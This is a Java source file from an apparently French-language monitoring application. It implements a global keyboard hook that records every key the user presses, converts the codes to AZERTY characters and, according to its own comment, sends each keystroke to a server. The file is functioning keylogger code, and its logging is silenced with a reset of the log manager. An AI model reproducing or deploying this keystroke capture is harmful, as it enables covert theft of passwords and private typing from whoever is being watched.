package Model.Watcher;

import java.util.logging.LogManager;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import Controller.Main;

/**
 * Envoie chaque touche entrée par l'utilisateur au serveur
 */
public class KeyListenerWatcher extends Watcher {
	static String TYPE="KEYBOARD";

	public KeyListenerWatcher() {
		super(TYPE);
	}

	public class GlobalKeyListener implements NativeKeyListener {
		/**
		 * Récupère la touche entrée par l'utilisateur et la traduit,
		 * si nécessaire, en clavier AZERTY
		 */
		public void nativeKeyPressed(NativeKeyEvent e) {
			String information=azerty(e.getKeyCode());
			createDataBeforeSendEvent("touche_appuyee", information);
		}

		public void nativeKeyReleased(NativeKeyEvent e) {}

		public void nativeKeyTyped(NativeKeyEvent e) {}
	}

	/**
	 * Enclenche la surveillance des touches entrées
	 */
	public void run() {
		try {
			//Boucle
			GlobalScreen.registerNativeHook();
			if(Main.surveillanceEnCours==false) GlobalScreen.unregisterNativeHook();
		} catch(NativeHookException ex) {
			System.err.println("There was a problem registering the native hook.");
			System.err.println(ex.getMessage());
			System.exit(1);
		}
		GlobalScreen.addNativeKeyListener(new GlobalKeyListener());
		LogManager.getLogManager().reset();
	}

	/**
	 * Transforme les caractères du clavier qwerty en azerty
	 * @param code
	 * @return
	 */
	public String azerty(int code) {		
		// On récupère l'élément du clavier qwerty
		String information=NativeKeyEvent.getKeyText(code);

		// Si il y a un changement avec le clavier français, l'information sera changée
		switch(code) {
		case 0:
			information="<";
			break;
		case 2:
			information="&";
			break;
		case 3:
			information="é";
			break;
		case 4:
			information="\"";
			break;
		case 5:
			information="'";
			break;
		case 6:
			information="(";
			break;
		case 7:
			information="-";
			break;
		case 8:
			information="è";
			break;
		case 9:
			information="_";
			break;
		case 10:
			information="ç";
			break;
		case 11:
			information="à";
			break;
		case 12:
			information=")";
			break;
		case 13:
			information="=";
			break;
		case 16:
			information="A";
			break;
		case 17:
			information="Z";
			break;
		case 26:
			information="^";
			break;
		case 27:
			information="$";
			break;
		case 30:
			information="Q";
			break;
		case 39:
			information="M";
			break;
		case 40:
			information="ù";
			break;
		case 41:
			information="²";
			break;
		case 43:
			information="*";
			break;
		case 44:
			information="W";
			break;
		case 50:
			information=",";
			break;
		case 51:
			information=";";
			break;
		case 52:
			information=":";
			break;
		case 53:
			information="! OU / paveNum"; // Même keyCode
			break;
		case 3662:
			information="+";
			break;
		case 3658:
			information="-";
			break;
		case 3638:
			information="MAJ";
			break;
		case 3639:
			information="* paveNum OU printEcr"; // Même keyCode
			break;
		}
		return information;
	}
}